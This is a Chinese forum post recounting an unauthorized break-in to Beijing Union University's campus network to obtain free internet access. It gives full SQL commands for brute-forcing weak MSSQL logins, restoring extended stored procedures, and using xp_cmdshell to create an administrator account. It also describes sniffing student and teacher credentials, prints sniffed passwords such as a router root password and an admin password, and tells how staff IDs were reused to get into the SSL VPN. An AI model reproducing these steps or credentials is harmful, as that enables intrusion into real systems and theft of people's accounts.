
# [原创]北京联合大学内网渗透小记

故事前景：

目前来到北京联合大学学习逆向工程,教室的局域网实在太卡,所以打起了校园无线网BUU的主意.但没有学号登录,只能另避蹊径想办法绕过验证.下面开始展开小逸的内网渗透之旅,没啥技术含量,大牛请飘过...

![](https://bbs.kanxue.com/upload/attach/201409/650812_siwqxvxdhlwi1uy.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_1za5tf4igmmrd0g.png)

校园内网渗透有几个思路,WEB渗透,MSQSQL弱口令提权,MYSQL弱口令提权,3389爆破...等.小逸就先从数据库弱口令开始吧.请出短小精悍的S扫描器,扫局域网网段内的1433端口,

![](https://bbs.kanxue.com/upload/attach/201409/650812_lwxmayska33kz2l.jpg)

扫出IP后整理成文本用`scan`(图片中我重命名了`scan`)挂字典批量扫MSSQL弱口令.

![](https://bbs.kanxue.com/upload/attach/201409/650812_zwdqjp3hwlqox7p.png)

开始穷举字典中的密码,匹配的保存为`M.txt`文本

![](https://bbs.kanxue.com/upload/attach/201409/650812_lfvi1v2d9uwev5a.png)

弱口令出来了,用SQL查询分析器（修正版）连接数据库,利用常用存储扩展提权,提权的代码度娘上泛滥.我会上传在附件中.

先查看是否开启终端(不开启用命令开启),终端端口为多少

查看3389端口

```
exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
```

![](https://bbs.kanxue.com/upload/attach/201409/650812_r48obceq0xyb681.png)

恢复时一些常用的SQL语句（利用`sp_addextendedproc`恢复大部分常用存储扩展，得先利用最顶上的语句恢复自己）：

```
use master
exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'
exec sp_addextendedproc xp_dirtree,'xpstar.dll'
exec sp_addextendedproc xp_enumgroups,'xplog70.dll'
exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'
exec sp_addextendedproc xp_loginconfig,'xplog70.dll'
exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'
exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'
exec sp_addextendedproc sp_OACreate,'odsole70.dll'
exec sp_addextendedproc sp_OADestroy,'odsole70.dll'
exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'
exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'
exec sp_addextendedproc sp_OAMethod,'odsole70.dll'
exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'
exec sp_addextendedproc sp_OAStop,'odsole70.dll'
exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'
exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'
exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'
exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'
exec sp_addextendedproc xp_regread,'xpstar.dll'
exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'
exec sp_addextendedproc xp_regwrite,'xpstar.dll'
exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
```

![](https://bbs.kanxue.com/upload/attach/201409/650812_obly65z0i06hrit.jpg)

xp_cmdshell添加用户：

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

exec master.dbo.xp_cmdshell 'net user CkDebug 123456 /add'

exec master.dbo.xp_cmdshell 'net localgroup administrators CkDebug /add'
```

![](https://bbs.kanxue.com/upload/attach/201409/650812_x66pr78gy7i53m2.png)

成功建立帐号 `CkDebug \123456`

![](https://bbs.kanxue.com/upload/attach/201409/650812_4aebqtoe1t67zed.png)

表中不少敏感信息,怕被查水表我就不贴全图了.(仅供测试,过后我会把帐号删除)

![](https://bbs.kanxue.com/upload/attach/201409/650812_wj7egv57m58bt88.png)

价值不大,不过目的已经达到,最终小逸建立了VPN达到了绕过验证上网的目的.

基本上扫出的弱口令都能提权,下面贴下几个图

![](https://bbs.kanxue.com/upload/attach/201409/650812_z9mpp5al4mzivjd.png)

(16核心8G服务器)

![](https://bbs.kanxue.com/upload/attach/201409/650812_iaguaz68hazaxwk.png)

(计费管理系统)

思路和手法都一样,我就不重复了.目的也已经达到,架设了VPN免费上网..但美中不足的是被限速了,服务器里下载速度可以达到100M独享,本地链接服务器VPN只是100KB左右(听说上一期师兄也用服务器代理,下载速度也是60M每秒.前段时间被管理员发现了所以限速了)我猜想是连接到BUU无线这被限制了速度,接入内网的时候限速了.想到两个解决思路.第一接WAN(教室内有网线,教室附近有机箱.弄个迷你路由接有限然后ap热点.).第二继续渗透路由,修改限速.(毕竟第一个比较危险,被发现的时候一抓一个准).

在服务器中嗅探抓包.

![](https://bbs.kanxue.com/upload/attach/201409/650812_1q1m0gc7hbcuxt5.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_bercp34ahxycevo.png)

`card.buu.edu.cn/homeLogin.action`是校园卡查询系统,嗅探到帐号(学号和密码),最后经过测试,校园卡一卡通的帐号能查询饭卡,登录BUU验证等,作用很大....(工号位数比较短的是教师的工号,最后发现,这工号作用很大)

![](https://bbs.kanxue.com/upload/attach/201409/650812_am42ik4bmj54upu.jpg)

嗅探出：

```text
9dfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0p5&6x3W2)9J5k6e0p5@1i4K6u0r3N6$3g2T1i4K6t1$3L8X3u0K6M7q4)9K6b7R3`.`。  路由
root   bshdl-97h
```

![](https://bbs.kanxue.com/upload/attach/201409/650812_h56trkfgasdubqt.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_rcxof8dq8wtoww2.png)

嗅探出：

```text
0bcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1J5x3o6u0Q4x3X3f1^5z5g2)9J5k6e0k6Q4x3V1k6E0N6h3y4Q4x3V1k6D9L8$3N6A6L8W2)9J5k6h3q4U0N6r3W2G2L8R3`.`.

admin  MUNCAdministrator
```

![](https://bbs.kanxue.com/upload/attach/201409/650812_rrc0kkvutulfj81.jpg)

嗅探出的敏感密码太多 我就不一一列举了,下面小逸就讲讲利用嗅探到的密码继续渗透

![](https://bbs.kanxue.com/upload/attach/201409/650812_xvxgcd67zmu3cey.jpg)

利用得到的工号和密码登录上了BUU.又一个办法免费上网了....

![](https://bbs.kanxue.com/upload/attach/201409/650812_v2o15tgkznawhhe.jpg)

在外网可以利用教师的工号登录SSL VPN

![](https://bbs.kanxue.com/upload/attach/201409/650812_mijvyc04altlb4n.jpg)

![](https://bbs.kanxue.com/upload/attach/201409/650812_t7p8ztawclk421z.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_2jxjm4xfezwifqa.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_le19vzkkslnu4ht.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_nsrxfkxgjvmbz5x.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_d0whw1yivljg4a0.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_wiopdxhgdigmego.png)

![](https://bbs.kanxue.com/upload/attach/201409/650812_ffru8m2of7o0267.png)

收集这些信息要是被有心人社工,估计,,,,,

MYSQL弱口令也测试过,利用查询命令也可以`root`.

还有不少敏感的网址和密码我就不一一截图了,既然目的已经达到了,就风扯吧,此次渗透只是测试,已经把日志和所建的帐号删除,请大大勿跨省.

[\[招生\]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [1.png](javascript:void(0);)（32.15kb，29次下载）
- [2.png](javascript:void(0);)（219.76kb，14次下载）
- [4.png](javascript:void(0);)（93.03kb，85次下载）
- [5.png](javascript:void(0);)（103.80kb，102次下载）
- [6.png](javascript:void(0);)（32.14kb，46次下载）
- [3.jpg](javascript:void(0);)（89.04kb，17次下载）
- [8.png](javascript:void(0);)（30.81kb，25次下载）
- [9.png](javascript:void(0);)（29.50kb，89次下载）
- [10.png](javascript:void(0);)（75.53kb，71次下载）
- [11.png](javascript:void(0);)（75.43kb，56次下载）
- [12.png](javascript:void(0);)（18.96kb，6次下载）
- [7.jpg](javascript:void(0);)（155.01kb，10次下载）
- [13.png](javascript:void(0);)（70.98kb，50次下载）
- [14.png](javascript:void(0);)（108.40kb，39次下载）
- [16.png](javascript:void(0);)（28.44kb，14次下载）
- [17.png](javascript:void(0);)（96.51kb，27次下载）
- [15.jpg](javascript:void(0);)（134.30kb，7次下载）
- [18.jpg](javascript:void(0);)（68.68kb，6次下载）
- [22.png](javascript:void(0);)（302.19kb，14次下载）
- [23.png](javascript:void(0);)（86.91kb，12次下载）
- [24.png](javascript:void(0);)（101.95kb，11次下载）
- [25.png](javascript:void(0);)（70.00kb，42次下载）
- [26.png](javascript:void(0);)（111.38kb，29次下载）
- [27.png](javascript:void(0);)（173.98kb，76次下载）
- [28.png](javascript:void(0);)（171.77kb，81次下载）
- [20.jpg](javascript:void(0);)（85.45kb，8次下载）
- [21.jpg](javascript:void(0);)（71.98kb，12次下载）
- [19.jpg](javascript:void(0);)（118.46kb，10次下载）
